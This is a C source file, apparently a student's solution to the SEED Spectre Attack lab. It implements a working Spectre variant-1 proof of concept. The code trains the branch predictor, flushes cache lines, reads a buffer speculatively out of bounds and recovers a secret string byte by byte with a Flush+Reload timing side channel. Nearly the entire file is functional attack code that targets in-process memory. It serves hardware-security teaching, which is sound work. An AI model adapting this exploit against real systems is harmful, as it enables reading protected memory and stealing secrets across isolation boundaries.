//source:- http://www.cis.syr.edu/~wedu/seed/Labs_16.04/System/Spectre_Attack/Spectre_Attack.pdf
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>
// uint8_t array[256*4096];
// int temp;
// char secret = 94;
// /*
// cache hit time threshold assumed
// */
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024*10



unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t temp = 0;
char* secret = "Some Secret Value";
uint8_t array[256*4096*2];
// Sandbox Function
int restrictedAccess(size_t x)
{
	if (x < buffer_size) {
		return buffer[x];
	} else {
		return 0;
	}
}


void flushSideChannel()
{
	int i;
	// Write to array to bring it to RAM to prevent Copy-on-write
	for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 0;
		// Flush the values of the array from cache
	for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

// void victim()
// {
// 	temp = array[secret*4096 + DELTA];
// }
void reloadSideChannel()
{
	int junk=0;
	register uint64_t time1, time2;
	volatile uint8_t* addr;
	int i;
	for(i = 0; i < 256; i++){
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk =*	addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD){
			printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
			printf("The Secret = %d.\n",i);
		}
	}
}


static int scores[256];
void reloadSideChannelImproved()
{
	int i;
	volatile uint8_t* addr;
	register uint64_t time1, time2;
	int junk = 0;
	for (i = 0; i < 256; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD)
		scores[i]++; 
		/*
		if cache hit, add 1 for this value
		*/
	}
}

void spectreAttack(size_t larger_x)
{
	int i;
	int s;
	// Train the CPU to take the true branch inside victim().
	for (i = 0; i < 10; i++) {
		_mm_clflush(&buffer_size);
		restrictedAccess(i);
	}
	// Flush buffer_size and array[] from the cache.
	_mm_clflush(&buffer_size);
	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
	// Ask victim() to return the secret in out-of-order execution.
	s = restrictedAccess(larger_x);
	array[s*4096 + DELTA] += 88;
}

int a[300];
int main(int argc, const char** argv)
{

	for(int t=0;t<20;t++){
		for(int j=0;j<300;j++){
			a[j]=0;
		}
		for(int j=1;j<10;j++){
		
			int i;
			uint8_t s;
			size_t larger_x = t+(size_t)(secret-(char*)buffer);
			// printf("larger_x %lu\n",larger_x);
			flushSideChannel();
			for (i = 0; i < 256;  i++) scores[i] = 0;
			for (i = 0; i < 1500; i++) {
				spectreAttack(larger_x);
				reloadSideChannelImproved();
			}
			int max = 1;
			for (i = 1; i < 256; i++){
				if(scores[max] < scores[i])  max = i;
			}
			if(scores[max]>0){
				// printf("Reading secret value at %p = ", (void*)larger_x);
				// printf("The  secret value is %c\n", max);
				// printf("The number of hits is %d\n", scores[max]);
				a[max]++;
			}
		}

		int max=0;
		for(int j=1;j<256;j++){
			if(a[max]<a[j]) max=j;
		}
		size_t l = t+(size_t)(secret-(char*)buffer);
		printf("Reading secret value at %lu : %c \n",l,max);


	}
		return (0);
}
